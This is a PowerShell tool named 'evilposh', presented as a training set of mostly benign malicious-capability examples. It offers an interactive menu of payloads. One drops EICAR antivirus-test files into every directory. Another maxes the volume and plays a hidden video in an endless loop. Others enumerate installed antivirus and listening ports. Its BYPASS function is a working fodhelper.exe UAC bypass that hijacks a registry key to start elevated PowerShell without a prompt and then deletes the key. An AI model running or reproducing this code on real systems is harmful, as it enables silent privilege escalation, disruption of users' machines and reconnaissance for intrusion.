Clear-Host
$scriptPath = $PSScriptRoot
Import-Module "$($scriptPath)\lib\Write-Ascii.psm1"

$global:Payload = 0
[string] $global:Path = "C:\"
$global:Persist = 0
$global:PayloadChoice = "None"
$global:Output = "Ready"
$global:AvCheckResult = $AntiVirusNames

$PortCheck = {
    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()            
    $Connections = $TCPProperties.GetActiveTcpListeners()            
    foreach($Connection in $Connections) {            
        if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }            
        $OutputObj = New-Object -TypeName PSobject            
        $OutputObj | Add-Member -MemberType NoteProperty -Name "ListeningPort" -Value $Connection.Port            
    }
    $global:Output = $OutputObj
}

$AVCheck = {
    $wmiQuery = "SELECT * FROM AntiVirusProduct"    
    $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery       
    [array]$AntivirusNames = $AntivirusProduct.displayName       
    $AvFinal = Switch($AntivirusNames) {
        {$AntivirusNames.Count -eq 0}{"Anti-Virus is NOT installed!";Continue}
        {$AntivirusNames.Count -eq 1 -and $_ -eq "Windows Defender"} {"ONLY Windows Defender is installed!";Continue}
        {$_ -ne "Windows Defender"} {"Anti-Virus is installed ($_)."}
    }
    $global:Output = $AvFinal
}

$nuke = {
    $enum = Get-ChildItem -Recurse -Directory $global:Path
    foreach($dir in $enum){
        $a++
        $random = Get-Random
        $name = "$($random).POSH"
        [string] $EncodedEicar = 'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo='
        [byte[]] $EicarBytes = [System.Convert]::FromBase64String($EncodedEicar)
        [string] $Eicar = [System.Text.Encoding]::UTF8.GetString($EicarBytes)
        $FilePath = New-Item -Path "$($global:Path)\$($dir)" -Name $name -ItemType File -Force
        Write-Host $FilePath
        Set-Content -Value $Eicar -Encoding ascii -Path $FilePath -Force
    }
    $global:Output = "Wrote EICAR file to $($a) directories."
    Clear-Host
}

$enum = {
    $enum = Get-ChildItem -Recurse -Directory $global:Path
        foreach($dir in $enum){
            $i++
        }
        $global:Output = "Found $($i) directories."
        Clear-Host
}

$whale = {
    Param (
            [Parameter(Mandatory = $False, Position = 0)]
            [ValidateNotNullOrEmpty()]
            [String] $VideoURL = "https://www.youtube.com/watch?v=ZJT5qK_S_Ig"
        )
        
        Function Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50 | Foreach-Object {$wshShell.SendKeys([char]174)};1..$Volume | Foreach-Object {$wshShell.SendKeys([char]175)}}
            Set-Speaker -Volume 50   
            $IEComObject = New-Object -com "InternetExplorer.Application"
            $IEComObject.visible = $False
            $IEComObject.navigate($VideoURL)
            Start-Sleep -s 5
            $EndTime = (Get-Date).addseconds(1000000000)
            do {
            $WscriptObject = New-Object -com wscript.shell
            $WscriptObject.SendKeys([char]175)
        }
        until ((Get-Date) -gt $EndTime)
}

Function Show-Menu {
    param(
        [string]$Title = "Main Menu"
    )
    $jollyroger = "`n888888888888888888888888888888888888888888888888888888888888`n888888888888888888888888888888888888888888 github:rcreecy 88`n8888888888888888888888888P`"`"  `"`"9888888888888888888888888888`n8888888888888888P`"88888P          988888`"9888888888888888888`n8888888888888888  `"9888            888P`"  888888888888888888`n888888888888888888bo `"9  d8o  o8b  P`" od88888888888888888888`n888888888888888888888bob 98`"  `"8P dod88888888888888888888888`n888888888888888888888888    db    88888888888888888888888888`n88888888888888888888888888      8888888888888888888888888888`n88888888888888888888888P`"9bo  odP`"98888888888888888888888888`n88888888888888888888P`" od88888888bo `"98888888888888888888888`n888888888888888888   d88888888888888b   88888888888888888888`n8888888888888888888oo8888888888888888oo888888888888888888888`n888888888888888888888888888888888888888888888888888888888888"
    Write-Host $jollyroger
    Write-Ascii "  evilposh"
    Write-Host "`n*Mostly* benign powershell examples for training on potentially malicious capabilties`n"
    Write-Host "PATH: $($global:Path)"
    Write-Host "PAYLOAD: $($global:PayloadChoice)"
    Write-Host "OUTPUT: $($global:Output)"
    Write-Host "`n========================== $Title ==========================="
    Write-Host "PATH - Set main path to execute directory based payloads against (Defaults to 'C:\')"
    Write-Host "TOOLS - Set your payload or leverage a utility function"
    Write-Host "PERSIST - Choose your persistence mechanism [TODO]"
    Write-Host "BYPASS - Attempt to launch powershell as administrator without UAC prompt"
    Write-Host "EXECUTE - Run the combination of parameters set"
    Write-Host "EXIT`n" 
}

Function Set-Path{
    $global:Path = Read-Host -Prompt "PATH"
    $PathValidation = Test-Path $global:Path
    if($PathValidation) {
        Clear-Host
        $global:Output = "PATH set to $($global:Path)"
        Clear-Host
    } else {
        Write-Host "Invalid path."
        Set-Path
    }  
}

Function Set-Payload{
    Write-Host `n"PAYLOAD OPTIONS:`n NUKE - Drop an EICAR file in every directory and subdirectory from base (PATH)`n WHALE - Set system volum to MAX and play Narwhales 10 hour in a hidden window`n`nTOOLS:`n AVCHECK - Check presence of current AV on system`n ENUM - List out directories and subdirectories from the base (PATH)`n PORTS - Run a check on listening ports on the machine`n`nBACK"
    $global:PayloadChoice = Read-Host "`nCHOICE"
    if($global:PayloadChoice -eq 'ENUM'){
        $global:Payload = 1
    } elseif($global:PayloadChoice -eq 'BACK'){
        clear-host
        return
    } elseif($global:PayloadChoice -eq 'NUKE'){
        $global:Payload = 2
    } elseif($global:PayloadChoice -eq 'WHALE'){
        $global:Payload = 3
    } elseif($global:PayloadChoice -eq 'AVCHECK'){
        $global:Payload = 4
    } elseif($global:PayloadChoice -eq 'PORTS'){
        $global:Payload = 5
    } elseif($global:PayloadChoice -eq 'BACK'){
        return
    } else {
        return
    }
    Clear-Host
    $global:Output = "Payload set to $($global:PayloadChoice)"
    Clear-Host
}

Function Start-Payload{
    if($global:Payload -eq 1){
        Invoke-Command -ScriptBlock $enum
    }
    elseif($global:Payload -eq 2){
        Invoke-Command -ScriptBlock $nuke
    } elseif($global:Payload -eq 3){
        Invoke-Command -ScriptBlock $whale
    } elseif($global:Payload -eq 4){
        Invoke-Command -Scriptblock $AVCheck
    } elseif($global:Payload -eq 5){
        Invoke-Command -ScriptBlock $PortCheck
    } else {
        Clear-Host
        $global:Output = "An invalid option was provided!"
        Clear-Host
        return
    }
}

Function Start-Bypass{
    $ShellChoice = Read-Host "Launch into evil-posh? (y/n)"
    Clear-Host
    if($ShellChoice -eq 'y'){
        [String]$program = "cmd /c start powershell.exe -noprofile $($PSCommandPath)"
    } elseif($ShellChoice -eq 'n'){
        [String]$program = "cmd /c start powershell.exe -noprofile"
    } elseif($ShellChoice -eq 'BACK'){
        Clear-Host
        return
    } else {
        Write-Host "Not valid input"
        Start-Bypass
    }
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
    Exit
}

do{
    Show-Menu
    $input = Read-Host "["
    switch($input){
        'PATH' {
            Set-Path
        }
        'TOOLS' {
            Set-Payload
        }
        'EXECUTE' {
            Start-Payload
        }
        'BYPASS' {
            Start-Bypass
        }
    }
}
until($input -eq 'EXIT')